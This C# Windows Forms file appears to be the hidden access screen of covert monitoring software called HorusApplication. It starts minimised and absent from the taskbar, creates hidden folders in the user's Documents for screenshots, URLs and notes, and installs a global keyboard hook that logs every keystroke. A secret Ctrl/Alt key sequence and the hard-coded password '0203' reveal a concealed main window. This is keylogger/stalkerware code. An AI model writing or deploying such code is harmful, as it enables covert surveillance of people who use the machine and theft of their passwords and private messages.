using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using HookEx;

namespace HorusApplication
{
    public partial class frmAcesso : Form
    {
        UserActivityHook hook;
        string log = string.Empty;
        int Teste = 0;       
        string Password = "";
        int countTimer = 0;
        
        public static frmPrincipal g = new frmPrincipal();
        
        public frmAcesso()
        {
            InitializeComponent();
            
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

            DirectoryInfo Salvas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas");
            Salvas.Attributes = FileAttributes.Hidden;

            DirectoryInfo telas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas");
            telas.Attributes = FileAttributes.Hidden;

            DirectoryInfo prints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\prints");
            prints.Attributes = FileAttributes.Hidden;

            DirectoryInfo wprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\wprints");
            wprints.Attributes = FileAttributes.Hidden;

            DirectoryInfo fprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\fprints");
            fprints.Attributes = FileAttributes.Hidden;

            DirectoryInfo url = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\url");
            url.Attributes = FileAttributes.Hidden;  

            DirectoryInfo notas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas");
            notas.Attributes = FileAttributes.Hidden;  

            hook = new UserActivityHook();
            hook.KeyUp += (s, e) =>
            {
                string filter = e.KeyData.ToString();                

                if (filter == "RControlKey")
                {
                    filter = "{Ctrl}";
                } 

                else if (filter == "LMenu")
                {
                    filter = "{Alt}";
                }

                else if (filter == "LControlKey")
                {
                    filter = "{Ctrl}";
                }  
                if (filter == "C")
                {
                    Teste = 1;
                    Password = "";
                }

                log += filter;
                Password += filter;

                textBox2.Text = log;

                if (Teste == 1)
                {
                    if (Password == "C{Alt}{Ctrl}")
                    {
                        this.WindowState = FormWindowState.Normal;
                        this.ShowInTaskbar = true;
                        
                        txt_Acesso.Focus();
                    }
                }
            }; 
        }

        public static string senha = "0203";

        private void button1_Click(object sender, EventArgs e)
        {           
                if (txt_Acesso.Text == senha)
                {
                    this.WindowState = FormWindowState.Minimized;
                    this.ShowInTaskbar = false;
                    txt_Acesso.Clear();

                    g.Visible = true;
                    g.WindowState = FormWindowState.Maximized;
                }
                else
                {
                    label3.Visible = true;
                    txt_Acesso.Clear();
                }       
        }

        private void frmAcesso_Load(object sender, EventArgs e)
        {
            g.Show();
            g.Visible = false;            
        }

        private void button4_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Maximized;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }

        private void frmAcesso_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        public const int WM_NCLBUTTONDOWN = 0xA1;

        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]

        public static extern int SendMessage(IntPtr hWnd,

        int Msg, int wParam, int lParam);

        [DllImportAttribute("user32.dll")]

        public static extern bool ReleaseCapture();

        private void panel2_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (Teste == 1)
            {
                countTimer++;
            }

            if (countTimer == 15)
            {
                countTimer = 0;
                Password = "";
                Teste = 0;
            }
            frmPrincipal.time = 1;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                txt_Acesso.PasswordChar = '\0';
                checkBox1.Text = "X";
            }
            else
            {
                txt_Acesso.PasswordChar = '*';
                checkBox1.Text = "";
            }
        }
        public static int cor = 1;

        private void timer2_Tick(object sender, EventArgs e)
        {
            if (cor == 2)
            {
                this.BackColor = Color.White;
                panel2.BackColor = Color.White;
                panel1.BackgroundImage = HorusApplication.Properties.Resources.Principal_Background2;
                btn_Acesso.BackColor = Color.Black;
                btn_Acesso.ForeColor = Color.White;
                label1.ForeColor = Color.Black;
                txt_Acesso.BackColor = Color.White;
                txt_Acesso.ForeColor = Color.Black;
            }
            else if (cor == 1)
            {
                this.BackColor = Color.Black;
                panel2.BackColor = Color.Black;
                panel1.BackgroundImage = HorusApplication.Properties.Resources.Principal_Background;
                btn_Acesso.BackColor = Color.White;
                btn_Acesso.ForeColor = Color.Black;
                label1.ForeColor = Color.White;
                txt_Acesso.BackColor = Color.Black;
                txt_Acesso.ForeColor = Color.White;
            }
            else { }

        }
    }
}
